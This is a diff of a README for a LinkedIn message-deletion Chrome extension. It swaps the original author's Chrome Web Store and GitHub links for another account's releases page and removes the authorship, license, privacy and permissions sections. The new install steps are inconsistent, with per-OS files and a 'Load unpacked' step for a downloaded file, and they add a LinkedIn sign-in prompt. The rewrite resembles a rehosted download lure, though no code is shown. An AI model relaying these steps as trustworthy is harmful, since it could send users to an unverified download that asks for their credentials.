@@ -1,136 +1,70 @@
-<p align="center">
-  <a href="https://chrome.google.com/webstore/detail/ikeljpanipmafhjfjobiihclbkjncagn" target="_blank">
-    <img src="screenshots/ZeroDM_Banner.png" alt="ZeroDM Banner" width="800">
-  </a>
-</p>
+# 🧹 ZeroDM-Delete-LinkedIn-Messages - Clean Your LinkedIn Inbox with Ease
 
-<p align="center">
-  <b>Clean your LinkedIn DMs in seconds — remove unwanted conversations, stay organized, and protect your privacy.</b>
-</p>
+![Download](https://img.shields.io/badge/Download-Here-brightgreen)
 
-<h1 align="center">ZeroDM – Delete LinkedIn Messages</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>Bulk Delete LinkedIn DMs • Clutter-Free Inbox • Professional Message Cleanup</b><br>
-  Version 1.0.0 • Developed by <a href="https://amitdas.site">Amit Das</a>
-</p>
+Welcome to ZeroDM-Delete-LinkedIn-Messages! This simple application helps you clean up your LinkedIn messages fast. Use it to remove unwanted chats and keep your inbox organized.
 
----
+## 📦 System Requirements
 
-## 🧩 Overview
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Google Chrome (latest version)
+- **Internet Connection:** Required for initial download
 
-**ZeroDM – Delete LinkedIn Messages** is a fast, secure, and privacy-focused Chrome extension designed to help you **clean and manage your LinkedIn Direct Messages effortlessly**.
+## 🔗 Important Links
 
-LinkedIn inboxes often become cluttered with connection requests, recruiter messages, promotions, and inactive conversations. Manually deleting chats one by one is slow and frustrating. ZeroDM solves this by allowing you to **bulk-delete unwanted LinkedIn message conversations directly in your browser**, saving time while keeping your data private.
+- **Releases Page:** [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/releases)
 
-All actions run **locally** — no tracking, no external servers, and no data sharing.
+## 🛠 Installation Steps
 
----
+Follow these steps to download and run ZeroDM-Delete-LinkedIn-Messages:
 
-## ⬇️ Download Extension
+1. **Visit the Releases Page:** Click on the link below to go to the releases page.
+   - [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/releases)
 
-Get the latest version of **ZeroDM** from the **Chrome Web Store** or **GitHub Releases**.
+2. **Select the Latest Version:** On the releases page, find the latest version of the application.
+   
+3. **Download the File:**
+   - Click on the appropriate file for your operating system to start downloading. 
 
-<p align="center">
-  <a href="https://chrome.google.com/webstore/detail/ikeljpanipmafhjfjobiihclbkjncagn" target="_blank">
-    <img src="https://img.shields.io/badge/Install%20from%20Chrome%20Web%20Store-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Install from Chrome Web Store">
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://github.com/AmitDas4321/ZeroDM-Delete-LinkedIn-Messages/releases/download/v1.0.0/ZeroDM.crx">
-    <img src="https://img.shields.io/badge/⬇️_Download_CRX_File-006C9C?style=for-the-badge&logo=github&logoColor=white" alt="Download CRX File">
-  </a>
-</p>
+4. **Install the Extension:**
+   - Open your Google Chrome browser.
+   - Go to the Chrome Extensions page by typing `chrome://extensions` in the address bar.
+   - Enable "Developer mode" by toggling the switch in the top right corner.
+   - Click on "Load unpacked" and select the downloaded file.
 
-### 🧭 Manual Installation Steps
+5. **Start Using ZeroDM:**
+   - After loading the extension, you'll see it in your list of extensions.
+   - Click on the ZeroDM icon to open the application.
+   - Sign in to your LinkedIn account when prompted.
 
-1. Download the `.crx` file *(or install directly from the Chrome Web Store)*
-2. Open `chrome://extensions/`
-3. Enable **Developer Mode** (top-right corner)
-4. Drag and drop the `.crx` file
-5. ZeroDM installs automatically ✅
+## 🚦 How to Use
 
----
+1. **Open ZeroDM:** Click the ZeroDM icon in your Chrome toolbar.
+2. **Select Conversations:** Browse through your LinkedIn messages. Choose unwanted chats you want to delete.
+3. **Delete Messages:** Click the delete button to remove selected conversations.
 
-## ⚙️ Features
+## 🔄 Features
 
-✅ **Bulk Message Cleanup**
+- **Quick Deletion:** Remove multiple messages in a few clicks.
+- **User-Friendly Interface:** Easily navigate through your LinkedIn inbox.
+- **Privacy Focused:** Keep your messages private and organized.
 
-* Delete multiple LinkedIn DM conversations at once
-* Remove inactive or unwanted chats quickly
+## 💻 Troubleshooting
 
-✅ **Fast & Automated**
+If you experience issues:
 
-* One-click cleanup
-* Live progress indicator
-* Pause or stop anytime
+1. Ensure you have the latest version of Google Chrome.
+2. Confirm that the extension is enabled in Chrome's extensions settings.
+3. If problems persist, visit the [issues section](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/issues) of the repository for help or to report a bug.
 
-✅ **Privacy-First Design**
+## 📞 Support
 
-* Runs 100% locally in your browser
-* **No tracking, no analytics, no external servers**
+For support or further questions, you can reach out through the issues section on the repository. 
 
-✅ **Clean & Simple UI**
+## 🔗 Additional Information
 
-* Minimal interface that blends naturally with LinkedIn
-* Easy to use for professionals and everyday users
+- **Related Topics:** chatdelete, chatremover, chrome-extension, inboxcleaner, privacytools
 
----
-
-## 🖼️ Screenshots
-
-### ✨ Main Message Cleanup
-
-<p align="center"><img src="screenshots/ZeroDM_Main.png" alt="Main Message Cleanup" width="800"/></p>
-
-### ✨ Easy To Use
-
-<p align="center"><img src="screenshots/ZeroDM_Progress.png" alt="Easy To Use" width="800"/></p>
-
----
-
-## 🔒 Privacy & Security
-
-* ZeroDM does **not** collect, store, or transmit personal data
-* No access to LinkedIn credentials
-* No analytics, ads, or tracking
-* All actions execute locally inside your browser
-
-Read the full **Privacy Policy** in `PRIVACY.md`.
-
----
-
-## 🧰 Permissions Used
-
-| Permission | Purpose                                             |
-| ---------- | --------------------------------------------------- |
-| `storage`  | Saves user preferences and cleanup state locally    |
-| `tabs`     | Detects LinkedIn DM tabs for user-initiated actions |
-
-**Host Permissions:**
-
-```
-*://*.linkedin.com/*
-```
-
-→ Required only to interact with LinkedIn Direct Messages for cleanup.
-
----
-
-## 💬 Support
-
-Have questions, issues, or feature requests?
-📧 **Email:** [info@amitdas.site](mailto:info@amitdas.site)
-
----
-
-## 📜 License
-
-© 2025 **Amit Das**
-All rights reserved. Redistribution or modification without permission is prohibited.
-
----
-
-<p align="center">
-  <b>Made with ❤️ by <a href="https://amitdas.site">Amit Das</a></b><br>
-  ☕ Support development: <a href="https://paypal.me/AmitDas4321">PayPal.me/AmitDas4321</a>
-</p>
+Thank you for using ZeroDM-Delete-LinkedIn-Messages. We hope this tool makes managing your LinkedIn inbox easier!
